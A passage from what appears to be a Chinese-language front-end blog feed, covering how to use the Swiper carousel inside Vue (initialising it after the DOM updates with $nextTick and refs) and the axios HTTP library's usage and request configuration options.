class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-slide&quot;</span> <span class="attr">v-for</span>=<span class="string">&quot;item in BannerList&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;item.imgUrl&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 如果需要分页器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-pagination&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 如果需要导航按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-button-prev&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-button-next&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="初始化Swiper"><a href="#初始化Swiper" class="headerlink" title="初始化Swiper"></a>初始化Swiper</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">var</span> mySwiper = <span class="keyword">new</span> Swiper (<span class="string">&#x27;#mySwiper&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">loop</span>: <span class="literal">true</span>, <span class="comment">// 循环模式选项</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果需要分页器</span></span><br><span class="line">        <span class="attr">pagination</span>: &#123;</span><br><span class="line">          <span class="attr">el</span>: <span class="string">&#x27;.swiper-pagination&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果需要前进后退按钮</span></span><br><span class="line">        <span class="attr">navigation</span>: &#123;</span><br><span class="line">          <span class="attr">nextEl</span>: <span class="string">&#x27;.swiper-button-next&#x27;</span>,</span><br><span class="line">          <span class="attr">prevEl</span>: <span class="string">&#x27;.swiper-button-prev&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Vue使用swiper"><a href="#Vue使用swiper" class="headerlink" title="Vue使用swiper"></a>Vue使用swiper</h1><p>当vue使用swiper并且结构有循环的话需要等dome结构挂载完毕之后再进行js的初始化操作</p><p>示例:</p><p>html结构</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!--banner轮播--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-container&quot;</span> <span class="attr">id</span>=<span class="string">&quot;mySwiper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-slide&quot;</span> <span class="attr">v-for</span>=<span class="string">&quot;item in BannerList&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;item.imgUrl&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 如果需要分页器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-pagination&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 如果需要导航按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-button-prev&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-button-next&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>等待循环过后进行js操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">watch:&#123;</span><br><span class="line">  <span class="attr">BannerList</span>:&#123;</span><br><span class="line">    <span class="function"><span class="title">handler</span>(<span class="params">newValue, oldValue</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.$nextTick( <span class="function">()=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> mySwiper = <span class="keyword">new</span> Swiper (<span class="string">&#x27;#mySwiper&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">loop</span>: <span class="literal">true</span>, <span class="comment">// 循环模式选项</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 如果需要分页器</span></span><br><span class="line">      <span class="attr">pagination</span>: &#123;</span><br><span class="line">        <span class="attr">el</span>: <span class="string">&#x27;.swiper-pagination&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 如果需要前进后退按钮</span></span><br><span class="line">      <span class="attr">navigation</span>: &#123;</span><br><span class="line">        <span class="attr">nextEl</span>: <span class="string">&#x27;.swiper-button-next&#x27;</span>,</span><br><span class="line">        <span class="attr">prevEl</span>: <span class="string">&#x27;.swiper-button-prev&#x27;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><blockquote><p>在watch中使用监听数据，</p><p> 当本次数据全部更新完毕后使用this.$nexTick()进行dome的元素操作</p></blockquote><p><code>提示</code></p><p>由于使用了vue框架但是vue并不推荐我们直接操作dome元素所以我们使用ref代替html中结构的id</p><p>改变前</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-container&quot;</span> <span class="attr">id</span>=<span class="string">&quot;mySwiper&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>改变后</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-container&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;mySwiper&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后再js中获取dome元素中进行替换</p><p>改变前</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mySwiper = <span class="keyword">new</span> Swiper (<span class="string">&quot;#mySwiper&quot;</span>, &#123;  </span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>改变后</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mySwiper = <span class="keyword">new</span> Swiper (<span class="built_in">this</span>.$refs.mySwiper, &#123;</span><br><span class="line">    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>axios配置</title>
      <link href="/2022/03/08/Axios%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/03/08/Axios%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<center> <h1>axios配置</h1></center><h1 id="什么是-axios"><a href="#什么是-axios" class="headerlink" title="什么是 axios"></a>什么是 axios</h1><p>Axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中</p><ul><li>从浏览器中创建 XMLHttpRequests</li><li>从 node.js 创建 http请求</li><li>支持 Promise API</li><li>拦截请求和响应</li><li>转换请求数据和响应数据</li><li>取消请求</li><li>自动转换 JSON 数据</li><li>客户端支持防御</li></ul><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>使用 npm:</p><p><code>npm install axios</code></p><p>使用 bower:</p><p><code>bower install axios</code></p><p>使用 cdn:</p><p><code>&lt;script src=&quot;https://unpkg.com/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;</code></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>执行 <code>GET</code> 请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为给定 ID 的 user 创建请求</span></span><br><span class="line">axios.get(<span class="string">&#x27;/user?ID=12345&#x27;</span>)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选地，上面的请求可以这样做</span></span><br><span class="line">axios.get(<span class="string">&#x27;/user&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">      <span class="attr">ID</span>: <span class="number">12345</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>执行 <code>POST</code> 请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">axios.post(<span class="string">&#x27;/user&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&#x27;Fred&#x27;</span>,</span><br><span class="line">    <span class="attr">lastName</span>: <span class="string">&#x27;Flintstone&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>执行多个并发请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUserAccount</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> axios.get(<span class="string">&#x27;/user/12345&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUserPermissions</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> axios.get(<span class="string">&#x27;/user/12345/permissions&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">axios.all([getUserAccount(), getUserPermissions()])</span><br><span class="line">  .then(axios.spread(<span class="function"><span class="keyword">function</span> (<span class="params">acct, perms</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 两个请求现在都执行完成</span></span><br><span class="line">  &#125;));</span><br></pre></td></tr></table></figure><h1 id="axios-API"><a href="#axios-API" class="headerlink" title="axios API"></a>axios API</h1><p>可以通过向 <code>axios</code> 传递相关配置来创建请求</p><p>axios(config)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发送 POST 请求</span></span><br><span class="line">axios(&#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;/user/12345&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&#x27;Fred&#x27;</span>,</span><br><span class="line">    <span class="attr">lastName</span>: <span class="string">&#x27;Flintstone&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>axios(url[, config])</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发送 GET 请求（默认的方法）</span></span><br><span class="line">axios(<span class="string">&#x27;/user/12345&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>请求方法的别名</li></ul><p>axios.request(config)</p><p>axios.get(url[, config])</p><p>axios.delete(url[, config])</p><p>axios.head(url[, config])</p><p>axios.post(url[, data[, config]])</p><p>axios.put(url[, data[, config]])</p><p>axios.patch(url[, data[, config]])</p><blockquote><p><strong>在使用别名方法时， <code>url</code>、<code>method</code>、<code>data</code> 这些属性都不必在配置中指定。</strong></p></blockquote><ul><li>并发</li></ul><p>处理并发请求的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">axios.all(iterable)</span><br><span class="line">axios.spread(callback)</span><br></pre></td></tr></table></figure><h1 id="创建实例"><a href="#创建实例" class="headerlink" title="创建实例"></a>创建实例</h1><p>可以使用自定义配置新建一个 axios 实例</p><p><code>axios.create([config])</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> instance = axios.create(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&#x27;https://some-domain.com/api/&#x27;</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">1000</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;<span class="string">&#x27;X-Custom-Header&#x27;</span>: <span class="string">&#x27;foobar&#x27;</span>&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>实例方法</li></ul><p>以下是可用的实例方法。指定的配置将与实例的配置合并</p><p>axios#request(config)</p><p>axios#get(url[, config])</p><p>axios#delete(url[, config])</p><p>axios#head(url[, config])</p><p>axios#post(url[, data[, config]])</p><p>axios#put(url[, data[, config]])</p><p>axios#patch(url[, data[, config]])</p><ul><li>请求配置</li></ul><p>这些是创建请求时可以用的配置选项。只有 <code>url</code> 是必需的。如果没有指定 <code>method</code>，请求将默认使用 <code>get</code> 方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// `url` 是用于请求的服务器 URL</span></span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;/user&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `method` 是创建请求时使用的方法</span></span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;get&#x27;</span>, <span class="comment">// 默认是 get</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `baseURL` 将自动加在 `url` 前面，除非 `url` 是一个绝对 URL。</span></span><br><span class="line">  <span class="comment">// 它可以通过设置一个 `baseURL` 便于为 axios 实例的方法传递相对 URL</span></span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&#x27;https://some-domain.com/api/&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `transformRequest` 允许在向服务器发送前，修改请求数据</span></span><br><span class="line">  <span class="comment">// 只能用在 &#x27;PUT&#x27;, &#x27;POST&#x27; 和 &#x27;PATCH&#x27; 这几个请求方法</span></span><br><span class="line">  <span class="comment">// 后面数组中的函数必须返回一个字符串，或 ArrayBuffer，或 Stream</span></span><br><span class="line">  <span class="attr">transformRequest</span>: [<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对 data 进行任意转换处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  &#125;],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `transformResponse` 在传递给 then/catch 前，允许修改响应数据</span></span><br><span class="line">  <span class="attr">transformResponse</span>: [<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对 data 进行任意转换处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  &#125;],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `headers` 是即将被发送的自定义请求头</span></span><br><span class="line">  <span class="attr">headers</span>: &#123;<span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>&#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `params` 是即将与请求一起发送的 URL 参数</span></span><br><span class="line">  <span class="comment">// 必须是一个无格式对象(plain object)或 URLSearchParams 对象</span></span><br><span class="line">  <span class="attr">params</span>: &#123;</span><br><span class="line">    <span class="attr">ID</span>: <span class="number">12345</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `paramsSerializer` 是一个负责 `params` 序列化的函数</span></span><br><span class="line">  <span class="comment">// (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)</span></span><br><span class="line">  <span class="attr">paramsSerializer</span>: <span class="function"><span class="keyword">function</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Qs.stringify(params, &#123;<span class="attr">arrayFormat</span>: <span class="string">&#x27;brackets&#x27;</span>&#125;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `data` 是作为请求主体被发送的数据</span></span><br><span class="line">  <span class="comment">// 只适用于这些请求方法 &#x27;PUT&#x27;, &#x27;POST&#x27;, 和 &#x27;PATCH&#x27;</span></span><br><span class="line">  <span class="comment">// 在没有设置 `transformRequest` 时，必须是以下类型之一：</span></span><br><span class="line">  <span class="comment">// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span></span><br><span class="line">  <span class="comment">// - 浏览器专属：FormData, File, Blob</span></span><br><span class="line">  <span class="comment">// - Node 专属： Stream</span></span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&#x27;Fred&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `timeout` 指定请求超时的毫秒数(0 表示无超时时间)</span></span><br><span class="line">  <span class="comment">// 如果请求话费了超过 `timeout` 的时间，请求将被中断</span></span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">1000</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `withCredentials` 表示跨域请求时是否需要使用凭证</span></span><br><span class="line">  <span class="attr">withCredentials</span>: <span class="literal">false</span>, <span class="comment">// 默认的</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `adapter` 允许自定义处理请求，以使测试更轻松</span></span><br><span class="line">  <span class="comment">// 返回一个 promise 并应用一个有效的响应 (查阅 [response docs](#response-api)).</span></span><br><span class="line">  <span class="attr">adapter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `auth` 表示应该使用 HTTP 基础验证，并提供凭据</span></span><br><span class="line">  <span class="comment">// 这将设置一个 `Authorization` 头，覆写掉现有的任意使用 `headers` 设置的自定义 `Authorization`头</span></span><br><span class="line">  <span class="attr">auth</span>: &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;janedoe&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;s00pers3cret&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `responseType` 表示服务器响应的数据类型，可以是 &#x27;arraybuffer&#x27;, &#x27;blob&#x27;, &#x27;document&#x27;, &#x27;json&#x27;, &#x27;text&#x27;, &#x27;stream&#x27;</span></span><br><span class="line">  <span class="attr">responseType</span>: <span class="string">&#x27;json&#x27;</span>, <span class="comment">// 默认的</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `xsrfCookieName` 是用作 xsrf token 的值的cookie的名称</span></span><br><span class="line">  <span class="attr">xsrfCookieName</span>: <span class="string">&#x27;XSRF-TOKEN&#x27;</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `xsrfHeaderName` 是承载 xsrf token 的值的 HTTP 头的名称</span></span><br><span class="line">  <span class="attr">xsrfHeaderName</span>: <span class="string">&#x27;X-XSRF-TOKEN&#x27;</span>, <span class="comment">// 默认的</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `onUploadProgress` 允许为上传处理进度事件</span></span><br><span class="line">  <span class="attr">onUploadProgress</span>: <span class="function"><span class="keyword">function</span> (<span class="params">progressEvent</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对原生进度事件的处理</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `onDownloadProgress` 允许为下载处理进度事件</span></span><br><span class="line">  <span class="attr">onDownloadProgress</span>: <span class="function"><span class="keyword">function</span> (<span class="params">progressEvent</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 对原生进度事件的处理</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `maxContentLength` 定义允许的响应内容的最大尺寸</span></span><br><span class="line">  <span class="attr">maxContentLength</span>: <span class="number">2000</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `validateStatus` 定义对于给定的HTTP 响应状态码是 resolve 或 reject  promise 。如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，promise 将被 resolve; 否则，promise 将被 rejecte</span></span><br><span class="line">  <span class="attr">validateStatus</span>: <span class="function"><span class="keyword">function</span> (<span class="params">status</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> status &gt;= <span class="number">200</span> &amp;&amp; status &lt; <span class="number">300</span>; <span class="comment">// 默认的</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `maxRedirects` 定义在 node.js 中 follow 的最大重定向数目</span></span><br><span class="line">  <span class="comment">// 如果设置为0，将不会 follow 任何重定向</span></span><br><span class="line">  <span class="attr">maxRedirects</span>: <span class="number">5</span>, <span class="comment">// 默认的</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `httpAgent` 和 `httpsAgent` 分别在 node.js 中用于定义在执行 http 和 https 时使用的自定义代理。允许像这样配置选项：</span></span><br><span class="line">  <span class="comment">// `keepAlive` 默认没有启用</span></span><br><span class="line">  <span class="attr">httpAgent</span>: <span class="keyword">new</span> http.Agent(&#123; <span class="attr">keepAlive</span>: <span class="literal">true</span> &#125;),</span><br><span class="line">  <span class="attr">httpsAgent</span>: <span class="keyword">new</span> https.Agent(&#123; <span class="attr">keepAlive</span>: <span class="literal">true</span> &#125;),</span><br><span class="line"></span><br><span class="line">  <span class="comment">// &#x27;proxy&#x27; 定义代理服务器的主机名称和端口</span></span><br><span class="line">  <span class="comment">// `auth` 表示 HTTP 基础验证应当用于连接代理，并提供凭据</span></span><br><span class="line">  <span class="comment">// 这将会设置一个 `Proxy-Authorization` 头，覆写掉已有的通过使用 `header` 设置的自定义 `Proxy-Authorization` 头。</span></span><br><span class="line">  <span class="attr">proxy</span>: &#123;</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">9000</span>,</span><br><span class="line">    <span 